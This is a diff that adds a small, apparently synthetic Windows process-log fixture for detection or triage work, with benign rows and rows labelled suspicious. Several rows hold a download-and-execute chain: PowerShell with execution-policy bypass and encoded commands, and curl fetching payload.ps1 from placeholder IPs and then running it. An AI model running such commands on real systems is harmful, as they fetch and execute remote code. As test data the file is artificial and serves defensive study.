@@ -1,0 +1,9 @@
+Time|DeviceName|AccountName|ProcessName|CommandLine|ParentProcess|RemoteIP|Case
+10:00:01|win-01|alice|chrome.exe|chrome.exe|explorer.exe|-|BENIGN
+10:05:10|win-02|bob|powershell.exe|powershell.exe -NoProfile Get-Process|explorer.exe|-|BENIGN_ADMIN
+10:10:00|win-03|user1|powershell.exe|powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA|cmd.exe|203.0.113.50|SUSPICIOUS_PS
+10:10:08|win-03|user1|curl.exe|curl.exe http://203.0.113.50/payload.ps1 -o C:\Users\Public\update.ps1|powershell.exe|203.0.113.50|SUSPICIOUS_PS
+10:10:20|win-03|user1|powershell.exe|powershell.exe -ExecutionPolicy Bypass C:\Users\Public\update.ps1|cmd.exe|203.0.113.50|SUSPICIOUS_PS
+10:20:00|win-04|svc_backup|powershell.exe|powershell.exe -File C:\Scripts\backup.ps1|taskeng.exe|-|BENIGN_BACKUP
+08:00:00|win-05|user2|powershell.exe|powershell.exe -ExecutionPolicy Bypass -EncodedCommand TEST|cmd.exe|198.51.100.10|OLD_UNRELATED
+11:30:00|win-05|user2|curl.exe|curl.exe http://198.51.100.10/payload.ps1 -o C:\Users\Public\old.ps1|powershell.exe|198.51.100.10|OLD_UNRELATED
